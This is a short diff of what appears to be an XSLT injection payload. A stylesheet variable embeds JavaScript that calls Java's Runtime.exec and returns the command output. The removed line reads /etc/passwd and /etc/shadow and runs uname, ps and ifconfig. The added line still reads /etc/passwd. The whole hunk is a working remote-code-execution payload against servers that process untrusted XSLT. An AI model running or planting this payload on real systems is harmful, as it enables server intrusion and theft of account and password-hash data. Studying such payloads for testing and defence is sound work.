@@ -8,7 +8,7 @@
         <xsl:variable name="js">
         <![CDATA[
             new java.util.Scanner(
-                java.lang.Runtime.getRuntime().exec("cat /etc/passwd;cat /etc/shadow; uname -a ; ps aux; ifconfig").getInputStream()
+                java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream()
             ).useDelimiter("\\Z").next()
         ]]>
         </xsl:variable>
